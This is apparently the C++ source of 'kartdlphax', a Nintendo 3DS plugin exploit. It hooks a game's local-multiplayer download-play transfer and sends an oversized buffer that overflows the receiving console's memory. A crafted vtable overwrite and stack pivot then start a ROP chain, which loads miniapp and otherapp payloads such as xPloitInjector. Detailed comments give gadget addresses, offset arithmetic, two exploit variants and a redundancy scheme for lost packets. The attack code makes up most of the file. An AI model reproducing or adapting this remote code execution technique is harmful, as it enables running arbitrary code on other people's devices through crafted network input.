#include <3ds.h>
#include "csvc.h"
#include <CTRPluginFramework.hpp>
#include "PatternManager.hpp"
#include "OSDManager.hpp"
#include "rt.h"
#include "ropbin_eur.h"
#include "miniapp_eur.h"
#include "ropbin_usa.h"
#include "miniapp_usa.h"
#include "ropbin_jap.h"
#include "miniapp_jap.h"
#include "otherapps/universal-otherapp.h"
#include "otherapps/xPloit-injector.h"

#include <vector>
#include <string.h>

extern "C" {
    u32 sendBufferCallback(u32 dst, u32 src, u32 size);
	u32 g_sendBufferret;
    void titleMenuCompleteCallback(u32 option);
    u32 g_titleMenuCompleteret;
}

static void NAKED sendBufferfunc() {
    __asm__ __volatile__
    (
        "MOV             R2, R4 \n" // The hook replaces two instructions, so we place them here.
        "ADD             R1, R1, R3 \n"
        "PUSH			 {R0, R2-R3, LR} \n" // Back up registers.
        "BL				 sendBufferCallback \n" // Jump to the send callback function.
        "MOV		     R1, R0 \n" // Replace the src with the return value.
        "POP		     {R0, R2-R3, LR} \n" // Load registers back.
        "LDR		     R12, =g_sendBufferret \n" // Return to the hook point.
        "LDR		     PC, [R12] \n"
    );
}

static void NAKED titleMenuCompletefunc() {
    __asm__ __volatile__
    (
        "LDR             R0, [R0,#0x4C]\n" // The hook replaces two instructions, so we place them here.
        "LDR             R2, [R7,#0x10]\n"
        "PUSH			 {R0-R3}\n"
        "BL				 titleMenuCompleteCallback\n" // Call function to signal title menu completed
        "POP			 {R0-R3}\n"
        "LDR			 LR, =g_titleMenuCompleteret\n" // Return to the hook point.
        "LDR			 PC, [LR]\n"
    );
}

namespace CTRPluginFramework
{
    LightEvent initEvent;
    RT_HOOK sendDataHook;
    RT_HOOK titleMenuCompleteHook;
    bool wrongOptionSelected = false;
    enum class PayloadKind : u8 {
        UNIVERSAL_OTHERAPP = 0,
        INJECTOR_11_16 = 1,
        INJECTOR_11_17 = 2,
    };
    struct ExploitSelectInfo {
        
        u32 magic = 0;
        bool useBuiltIn = false;
        PayloadKind payloadKind = PayloadKind::INJECTOR_11_17;
        bool isN3DS = false;
        u8 region = 0;

        static constexpr u32 validMagic = 0x3246434B;

        void Set(bool useBuiltIn_, PayloadKind payloadKind_, bool isN3DS_, u8 region_) {
            magic = validMagic;
            useBuiltIn = useBuiltIn_;
            payloadKind = payloadKind_;
            isN3DS = isN3DS_;
            region = region_;
        }

        void Load() {
            File config("kartdlphax_config.bin", File::READ);
            if (!config.IsOpen())
                return;
            config.Read(this, sizeof(ExploitSelectInfo));
        }

        void Save() {
            File config("kartdlphax_config.bin", File::RWC | File::TRUNCATE);
            if (!config.IsOpen())
                return;
            config.Write(this, sizeof(ExploitSelectInfo));
        }

        bool IsValid(u32 myRegion) {
            return magic == validMagic && region == myRegion && (useBuiltIn || File::Exists("/kartdlphax_otherapp.bin"));
        }
    };

    static inline u32   decodeARMBranch(const u32 *src)
	{
		s32 off = (*src & 0xFFFFFF) << 2;
		off = (off << 6) >> 6;
		return (u32)src + 8 + off;
	}
    static inline int roundUp(int numToRound, int multiple) 
    {
        return ((numToRound + multiple - 1) / multiple) * multiple;
    }

    // This function executes before the game runs.
    void    PatchProcess(FwkSettings &settings)
    {
        LightEvent_Init(&initEvent, RESET_ONESHOT);

        const u8 getBufferSizePat[] = {0x09, 0x40, 0x20, 0x10, 0x29, 0x00, 0x56, 0xE3, 0xB1, 0x00, 0x00, 0x0A, 0x29, 0x00, 0xA0, 0xE3};
        const u8 sendBufferDataPat[] = {0x08, 0x00, 0x87, 0xE2, 0x94, 0x06, 0x03, 0xE0, 0x03, 0x10, 0x41, 0xE0, 0x04, 0x00, 0x51, 0xE1};
        const u8 titleMenuCompletePat[] = {0x03, 0x00, 0x50, 0xE3, 0x01, 0x80, 0xA0, 0xE3, 0x24, 0x00, 0x00, 0x0A, 0x07, 0x00, 0x50, 0xE3};

        PatternManager pm;

        // Search the function that sets the send buffer size.
        pm.Add(getBufferSizePat, 0x10, [](u32 addr) {
			u32 func = decodeARMBranch((u32*)(addr + 0x248)) + 0x10;
			*((u32*)func) = 0xE3A03207; // Tell the game the output buffer is giant (0x70000000)
			return true;
		});

        // Search the function that sends the buffer data.
        pm.Add(sendBufferDataPat, 0x10, [](u32 addr) {
			rtInitHook(&sendDataHook, addr + 0x18, (u32)sendBufferfunc);
			rtEnableHook(&sendDataHook);
			g_sendBufferret = addr + 0x18 + 0x8; // + 0x8 because the hook replaces 2 instructions.
			return true;
		});

        // Search the function called when pressing a button in the title screen
        pm.Add(titleMenuCompletePat, 0x10, [](u32 addr) {
			rtInitHook(&titleMenuCompleteHook, addr - 0x5C, (u32)titleMenuCompletefunc);
			rtEnableHook(&titleMenuCompleteHook);
			g_titleMenuCompleteret = addr - 0x5C + 0x8; // + 0x8 because the hook replaces 2 instructions.
			return true;
		});

        pm.Perform();

        settings.WaitTimeToBoot = Seconds(0);
    }

    // This will be called when the user presses any option in the title screen
    void titleMenuCompleteCallback(u32 selectedOption) {
        // Check that the user properly selected local multiplayer
        if (selectedOption != 1) {
            OSD::Notify("Please select Local Multiplayer!");
            wrongOptionSelected = true;
        }
        // Signal the main function to continue
        LightEvent_Signal(&initEvent);

    }

    // While the main flaw that enables the exploit is present in all of the game regions, KOR and TWN use a
    // slightly later build of the download play application. This build has a different memory layout
    // which messes up the exploit, so a completely different explotation path is required.

    static constexpr u32 TRANSFERBLOCKSIZE = 0x37C;                             // The size in bytes of a single transfer block.

	u32 pwnBuffer[TRANSFERBLOCKSIZE / 4] = { 0 };                               // Buffer sent with the vtable pwn
    int gameRegion = -1;                                                        // Region of the game. EUR -> 0, USA -> 1, JAP -> 2

    #define EXPLOIT_VARIANT 1                                                   // Exploit variant to use, both achieve the same thing
    static constexpr u32 VTABLEPWNBLOCK = 0x1740;                               // Block in the buffer that cointains the vtable pwn
    static constexpr u32 ORIGSTACK1 = 0x0FFFFDC0;                               // Original stack addr when the vtable pwn first exploit variant triggers 
    static constexpr u32 ORIGSTACK2 = 0x0FFFFDC8;                               // Original stack addr when the vtable pwn second exploit variant triggers 
    static constexpr u32 LDR_R3_FROM_R0 = 0x0012E54C;                               // Jumping here loads [R0, #0x8] into R3
    static constexpr u32 BXLR = LDR_R3_FROM_R0 + 0x58;                              // Jumping here does BX LR, returning immediately
    static constexpr u32 STACKPIVOT = 0x00113688;                               // Jumping here can control SP + PC from value in R3
    static constexpr u32 PLUGINBUFFERSIZE = TRANSFERBLOCKSIZE * 0xA82;          // Size of the fake sent buffer ~2.4MB
    static constexpr u32 STARTBUFFER[] = {                                      // Start of the recv buffer in the client application
        0x1424FDB4,
        0x1424F774,
        0x1424F524
    }; // Korean buffer starts at 0x142308FC                         
    static constexpr u32 ROPBUF[] = {                                           // Start of the ROP in the client application
        STARTBUFFER[0] + 8,
        STARTBUFFER[1] + 8,
        STARTBUFFER[2] + 8
    };                              
    static constexpr u32 MINIAPPBUF[] = {                                       // Start of the miniapp in the client application, page aligned
        0x14253000, 
        0x14254000,
        0x14254000
    };                              
    static constexpr u32 OTHERAPPBUF[] = {                                      // Start of the otherapp in the client application
        STARTBUFFER[0] + TRANSFERBLOCKSIZE * 16, 
        STARTBUFFER[1] + TRANSFERBLOCKSIZE * 22, 
        STARTBUFFER[2] + TRANSFERBLOCKSIZE * 24
    };

    const unsigned char* ropbin_addr[] = {payload_eur_bin, payload_usa_bin, payload_jap_bin};
    const long int ropbin_size[] = {payload_eur_bin_size, payload_usa_bin_size, payload_jap_bin_size};

    const unsigned char* miniapp_addr[] = {miniapp_eur_bin, miniapp_usa_bin, miniapp_jap_bin};
    const long int miniapp_size[] = {miniapp_eur_bin_size, miniapp_usa_bin_size, miniapp_jap_bin_size};

    static u8* exploitBuffer = nullptr; // Fake buffer to be sent

    // The exploit magic happens here. This function is mitm just before
    // the game memcopies src to dst. The return value changes the src address.
    // Size is always 0x37C.
	u32 sendBufferCallback(u32 dst, u32 src, u32 size) {
		static u32 currblock = 0;
        static u32 buffstart = src;
		if (currblock == VTABLEPWNBLOCK) { 
            // This block causes the vtable pwn that triggers the actual exploit. During development I fist found the exploit variant 1,
            // but due to a missunderstanding on how ARM conditional flags work, I thought it was not viable. After that, I found exploit variant 2,
            // which is the one I went forward with. Now that I properly understand ARM conditional flags, both variants can be used for the exploit
            // and produce the exact same results.
            //
            // In order to start our ROP, we need to somehow change the value of the stack pointer (SP), this can be done using the instructions at STACKPIVOT:
            //
            // ADD             SP, SP, R3
            // LDR             PC, [SP],#4
            //
            // As you can see, the first instruction sets the stack pointer from the addition of the current SP value and R3. After that, it pops the value
            // from SP into PC. If we want to start our ROP, we need to have the proper value in R3, as well as cause a jump to this address (the initial value of SP
            // is not important, as when the exploit triggers it's always the same and can be adjusted by changing R3).
            //
            // NOTE: The following documentation uses C pointer arithmetic notation for accessing pwnBuffer. If you want to obtain the actual byte offset into the buffer
            // (so that it matches ARM assembly notation), you need to multiply the offset value by 4.
            // For example, pwnBuffer + 0x35 is actually byte offset (u8*)pwnBuffer + (0x35 * 4) = (u8*)pwnBuffer + 0xD4.
            //
#if EXPLOIT_VARIANT == 1
            // This is the first variant of the exploit, it triggers by overwritting a vtable in the function that updates the button state, which runs every frame.
            // In the European version of the game, this happens at address 0x004143D0:
            //
            // LDR             R1, [R0]
            // LDR             R1, [R1,#0xC]
            // BLX             R1
            //
            // Normally, the value R0 is meant to be a pointer to an object with a vtable. However, this overlaps with the address pwnBuffer + 0x35.
            // When the first instruction executes, and the buffer overflow has happened, it causes it to load the contents of pwnBuffer + 0x35 into R1.
            // After that, the second instruction uses that value + 0xC to obtain a function pointer to jump to. We can use this to cause an arbitrary jump.
            // First, we set up pwnBuffer[0x35] to point to pwnBuffer + 0x37:
            pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4;
            // When the game then adds 0xC to that value, it obtains the address pwnBuffer + 0x3A, which we can set to the address we want to jump to:
			pwnBuffer[0x3A] = LDR_R3_FROM_R0;
            // So why aren't we jumping into STACKPIVOT directly? As stated before, we need to set R3 to the proper value, but at this point R3 doesn't  
            // have the proper value. Instead, we have to jump to somewhere else that can set R3 from R0 and then cause another jump to STACKPIVOT
            // Luckily, the function at LDR_R3_FROM_R0 can do just that (some unimportant parts of the function have been removed):
            //
            // LDR             R3, [R0,#8]
            // ...
            // LDR             R2, [R0,#0xC]
            // ...
            // LDR             R0, [R0,#0x10]
            // TST             R0, #1
            // ...
            // BEQ             branch_R2
            // ...
            // branch_R2:
            //      BX              R2
            //
			// At this point, R0 still holds the address pwnBuffer + 0x35, so we can modify the values after
            // that address to be able to set R3 and jump to STACKPIVOT.
            // Fist, we set up pwnBuffer + 0x37, which corresponds to [R0, #8] and contains the value that will be placed into R3:
			pwnBuffer[0x37] = ROPBUF[gameRegion] - ORIGSTACK1;
            // When ADD SP, SP, R3 executes later, this will set the value of SP to the start of the ROP.
            // We now have to set up the value of pwnBuffer + 0x38, which corresponds to [R0, #0xC] and contains the value that will be placed into R2, and will
            // be jumped to later:
			pwnBuffer[0x38] = STACKPIVOT;
            // Finally, we need to make sure the branch is performed properly, so we need to set the value at pwnBuffer + 0x39, which corresponds to [R0, #0x10] to
            // be 0, so the TST, #1 instruction makes the game branch to BX R2:
            pwnBuffer[0x39] = 0;
            // At this point, the game will jump to R2, which contains the address of the stack pivot with the proper R3 value set, and eventually, execute ROP.
#elif EXPLOIT_VARIANT == 2
            // This is the second variation of the exploit, it triggers by overwritting another vtable in another function that updates the buttons state.
            // The second variant triggers at a later point after the first variant has already triggered, so in order to use this variant,
            // we first need to prevent the first variant from crashing. For that, we can just set the function to jump to to immediately return (BX LR).
            // Check the documentation of the previous variant to understand why these values are used.
            pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4;
			pwnBuffer[0x3A] = BXLR;
            // After the first variant has been disabled, we can continue.
            // In the European version of the game, this happens at address 0x003EA1F4:
            //
            // LDR             R1, [R0]
            // LDR             R1, [R1,#0x18]
            // BX              R1
            //
            // As you can see, this has the same structure as the function in the previous variant, but luckily for us, when it executes, the value at R3 comes
            // from pwnBuffer + 0x11, so we don't need to jump into an intermediary function to set R3 to the proper value.
            // Sadly, I can't document where R3 is set, as it comes from a previous function execution and without a debugger, it's very difficult to guess.
            // First, we set the value at pwnBuffer + 0x11 so that it gets loaded into R3:
			pwnBuffer[0x11] = ROPBUF[gameRegion] - ORIGSTACK2 - 2;
            // The "- 2" part is because the value loaded into R3 is actually pwnBuffer[0x11] + 2, so we substract 2 to cancel it out.
            // Normally, the value R0 is meant to be a pointer to an object with a vtable. However, this overlaps with the address pwnBuffer + 0x43.
            // When the first instruction executes, and the buffer overflow has happened, it causes it to load the contents of pwnBuffer + 0x43 into R1.
            // After that, the second instruction uses that value + 0x18 to obtain a function pointer to jump to. We can use this to cause an arbitrary jump.
            // First, we set up pwnBuffer[0x43] to point to itself:
			pwnBuffer[0x43] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x43 * 4;
			// When the game then adds 0x18 to that value, it obtains the address pwnBuffer + 0x49, which we can set to the address we want to jump to:
			pwnBuffer[0x49] = STACKPIVOT;
            // At this point, the game will jump to the stack pivot with the proper value at R3 set, and eventually, execute ROP.
#endif
			currblock++;
			return (u32)pwnBuffer;
		}

        // Display screen message.
        if (currblock < VTABLEPWNBLOCK)
            OSDManager["t"].SetScreen(false).SetPos(15,21) = Utils::Format("Sending hax: %.1f%%", ((float)currblock / VTABLEPWNBLOCK) * 100.f);
        else
            OSDManager["t"].SetScreen(false).SetPos(15,21) = "Done!";
        
        currblock++;

        // Wait a few block transfers after the pwn to exit.
        if (currblock >= VTABLEPWNBLOCK + 0xF) { Sleep(Seconds(1.f)); Process::ReturnToHomeMenu(); }

        // Replace src with our exploit buffer.
        if (currblock * TRANSFERBLOCKSIZE < PLUGINBUFFERSIZE)
		    return (u32)exploitBuffer + (src - buffstart);
        else
            return src;
	}

    // This function constructs the buffer that will be sent.
    // The buffer has the following structure:
    //               Offset               Size       Value
    //                  0x0                0x4       size of the otherapp payload (block aligned)
    //                  0x4                0x4       amount of times the otherapp payload is repeated
    //                  0x8            ROPsize       ROP chain
    //      next page align        miniappsize       MINIAPP payload
    //             block 16  off 0x0 * off 0x4       OTHERAPP payload repeated until buffer is filled
    //
    // Why is the otherapp payload repeated? First we have to talk about paral... ehem, the transfer protocol:
    // It looks like the game does some sort of UDP for sending the data. The host transfers the entire buffer in one go,
    // even tho some of the blocks may be lost in the process. The client keeps track of which blocks were recieved, so after
    // the first transfer is over, it asks the host for the missing blocks until it has all of them. The problem is the buffer 
    // overflow and the vtable pwn executing ROP happens before the first transfer even finishes. This causes the recieve buffer 
    // to have "gaps" of zeroed data where the blocks were lost. This is the main reason the exploit fails sometimes before miniapp
    // takes control (when the screen starts flashing), as the vtable pwn + rop + miniapp blocks all need to be intact.
    // Otherapp though is pretty big and occupies several blocks, and the chances of any of them being lost is pretty high.
    // The solution is to send many copies of otherapp, and let the miniapp payload reconstruct it from all the copies (normally
    // about 70 copies are sent). That's the reason we send the otherapp size and the repeat times at the start of the buffer.
    // The reconstruct process checks if the current otherapp block first u32 is 0, if it is, it checks the next copy, and so on. 
    // That's why we set the first value of a block to a magic value if it is 0, so miniapp can differentiate it from a missing block.
    void    constructExploitBuffer(ExploitSelectInfo& info) {
        u32 otherappsize;
        // Shouldn't happen, but just in case
        if (!info.IsValid(gameRegion))
            Process::ReturnToHomeMenu();

        // Allocate exploit buffer.
        exploitBuffer = (u8*)calloc(PLUGINBUFFERSIZE, 1);
        if (!exploitBuffer) svcBreak(USERBREAK_USER);

        // Copy the rop chain and the miniapp to to the exploit buffer.
        memcpy((exploitBuffer + ROPBUF[gameRegion] - STARTBUFFER[gameRegion]), ropbin_addr[gameRegion], ropbin_size[gameRegion]);
        memcpy((exploitBuffer + MINIAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), miniapp_addr[gameRegion], miniapp_size[gameRegion]);

        // Copy the selected otherapp to the buffer
        {
            if (!info.useBuiltIn) { // Load file from SD
                File otherappFile("/kartdlphax_otherapp.bin", File::READ);
                if (otherappFile.IsOpen()) {
                    // Read the otherapp file into the first copy in the buffer.
                    otherappsize = otherappFile.GetSize();
                    otherappFile.Read((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherappsize);
                } else { // If the file failed to read, panic.
                    Process::ReturnToHomeMenu();
                }
            } else { // Load built-in file
                if (info.payloadKind == PayloadKind::UNIVERSAL_OTHERAPP) { // Load universal-otherapp
                    // Copy the built-in otherapp into the first copy in the buffer.
                    otherappsize = otherapp_bin_size;
                    memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherapp_bin, otherappsize);
                } else if (info.payloadKind == PayloadKind::INJECTOR_11_16) { // Load 3DS ROP xPloit Injector
                    // Copy the built-in otherapp into the first copy in the buffer.
                    otherappsize = xploit_injector_1116_bins_sizes[info.isN3DS][info.region];
                    memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), xploit_injector_1116_bins[info.isN3DS][info.region], otherappsize);
                } else if (info.payloadKind == PayloadKind::INJECTOR_11_17) { // Load 3DS ROP xPloit Injector
                    // Copy the built-in otherapp into the first copy in the buffer.
                    otherappsize = xploit_injector_1117_bins_sizes[info.isN3DS][info.region];
                    memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), xploit_injector_1117_bins[info.isN3DS][info.region], otherappsize);
                }
            }

            // There are some issues if the sent payload is to small apparently.
            if (otherappsize < 0x3000) {
                memset((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + otherappsize, 0, 0x3000 - otherappsize);
                otherappsize = 0x3000;
            }
        }

        // Round the otherapp size to next block size and calculate the repeat times.
        otherappsize = roundUp(otherappsize, TRANSFERBLOCKSIZE);
        u32 repeatTimes = (PLUGINBUFFERSIZE - (OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion])) / otherappsize;

        // Set the first u32 in each block in the otherapp to a magic value in case it is 0, so miniapp can differentiate it with a missing block.
        for (int i = 0; i < otherappsize / TRANSFERBLOCKSIZE; i++) {
            u32* block = (u32*)((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + TRANSFERBLOCKSIZE * i);
            if (block[0] == 0)
                block[0] = 0x05500000;
        }

        // Repeat the first copy of otherapp until it fills the entire exploit buffer.
        for (int i = 1; i < repeatTimes; i++) {
            memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + otherappsize * i, (exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherappsize);
        };

        // Set the otherapp size and repeated times.
        ((u32*)exploitBuffer)[0] = otherappsize;
        ((u32*)exploitBuffer)[1] = repeatTimes;
    }

    void    SetupConfig(ExploitSelectInfo& info) {
        Process::Pause();
        info.Load();
        const char* regTexts[] {"Europe", "America", "Japan"};
        std::string title = ToggleDrawMode(Render::UNDERLINE) + CenterAlign("kartdlphax v1.3.3") + ToggleDrawMode(Render::UNDERLINE) + "\n";
        bool loopContinue = true;
        bool promptSettings = false;
        while (loopContinue) {
            if (info.IsValid(gameRegion)) {
                std::string content = ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "Source Console:" + ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "\n";
                content += "    Region: " + std::string(regTexts[gameRegion]) + "\n";
                content += "    Type: " + std::string(System::IsNew3DS() ? "New 3DS" : "Old 3DS") + "\n\n";
                content += ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "Target Console:" + ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "\n";
                content += "    Region: " + std::string(regTexts[info.region]) + "\n";
                content += "    Type: " + std::string(info.isN3DS ? "New 3DS" : "Old 3DS") + "\n\n";
                content += ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "Selected Exploit:" + ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "\n";
                if (!info.useBuiltIn)
                    content += "    Custom file from SD";
                else if (info.payloadKind == PayloadKind::UNIVERSAL_OTHERAPP)
                    content += "    universal-otherapp";
                else if (info.payloadKind == PayloadKind::INJECTOR_11_16)
                    content += "    xPloitInjector (11.16)";
                else if (info.payloadKind == PayloadKind::INJECTOR_11_17)
                    content += "    xPloitInjector (11.17)";

                Keyboard kbd(title + content);
                kbd.Populate(std::vector<std::string>({"Use settings", "Change settings", "Exit"}));
                switch (kbd.Open())
                {
                case 0:
                    loopContinue = false;
                    break;
                case 1:
                    promptSettings = true;
                    break;
                case 2:
                    Process::Play();
                    Process::ReturnToHomeMenu();
                default:
                    Process::Play();
                    System::Reboot();
                    break;
                }
            }
            if (!loopContinue)
                break;
            if (!info.IsValid(gameRegion) || promptSettings) {
                u8 targetRegion = gameRegion;
                bool targetIsN3DS = false;
                bool useBuiltIn = false;
                PayloadKind useKind = PayloadKind::INJECTOR_11_17;
                std::string content = "Select the " + ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "target console" + ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + " type.";
                Keyboard kbd(title + content);
                kbd.Populate(std::vector<std::string>({"Old 3DS Family", "New 3DS Family"}));
                kbd.CanAbort(false);
                switch (kbd.Open())
                {
                case 0:
                    targetIsN3DS = false;
                    break;
                case 1:
                    targetIsN3DS = true;
                    break;
                default:
                    Process::Play();
                    System::Reboot();
                    break;
                }
                content = "Select the exploit type.\n\nHINT: Select the exploit based on\nthe " + ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + "target console" + ToggleDrawMode(Render::BOLD | Render::UNDERLINE) + " firmware version.\n";
                content += "Firmware 11.17:\n    xPloitInjector (11.17)\n";
                content += "Firmware 11.16:\n    xPloitInjector (11.16)\n";
                content += "Firmware 11.15 or less:\n    universal-otherapp\n\n";
                bool customFileExists = File::Exists("/kartdlphax_otherapp.bin");
                std::string sdEntry = "Custom file from SD";
                if (customFileExists) {
                    content += "Custom payload found on SD.";
                } else {
                    sdEntry = Color(0xc0, 0xc0, 0xc0) << "" + ToggleDrawMode(Render::STRIKETHROUGH) + sdEntry + ToggleDrawMode(Render::STRIKETHROUGH);
                }

                kbd.GetMessage() = title + content;
                kbd.Populate(std::vector<std::string>({"ROPxPloitInjector (11.17)", "ROPxPloitInjector (11.16)", "universal-otherapp", sdEntry}));
                bool typeloop = true;
                while (typeloop)
                {
                    switch (kbd.Open())
                    {
                    case 0:
                        useBuiltIn = true;
                        useKind = PayloadKind::INJECTOR_11_17;
                        typeloop = false;
                        break;
                    case 1:
                        useBuiltIn = true;
                        useKind = PayloadKind::INJECTOR_11_16;
                        typeloop = false;
                        break;
                    case 2:
                        useBuiltIn = true;
                        useKind = PayloadKind::UNIVERSAL_OTHERAPP;
                        typeloop = false;
                        break;
                    case 3:
                        if (customFileExists)
                        {
                            useBuiltIn = false;
                            typeloop = false;
                        }
                        break;
                    default:
                        Process::Play();
                        System::Reboot();
                        break;
                    }
                }
                info.Set(useBuiltIn, useKind, targetIsN3DS, targetRegion);
            }
        }
        Process::Play();
    }

    // This function is called after the game starts executing and CTRPF is ready.
    int     main(void)
    {
        LightEvent_Wait(&initEvent);

        if (wrongOptionSelected) {
            Sleep(Seconds(1));
            Process::ReturnToHomeMenu();
        }

        ExploitSelectInfo info;

        u32 tidLow = (u32)Process::GetTitleID();
        switch (tidLow)
        {
        case 0x00030700:
            gameRegion = 0;
            break;
        case 0x00030800:
            gameRegion = 1;
            break;
        case 0x00030600:
            gameRegion = 2;
            break;
        default:
            break;
        }

        // Setup the config and construct the exploit in memory
        SetupConfig(info);
        constructExploitBuffer(info);
        OSD::Notify("Exploit Ready!");
        info.Save();

        // Wait for process to exit.
        Process::WaitForExit();

        free(exploitBuffer);

        // Exit plugin
        return (0);
    }
}

// Thunk from C to C++.
u32 sendBufferCallback(u32 dst, u32 src, u32 size) {
	return CTRPluginFramework::sendBufferCallback(dst, src, size);
}

// Thunk from C to C++.
void titleMenuCompleteCallback(u32 option) {
	CTRPluginFramework::titleMenuCompleteCallback(option);
}
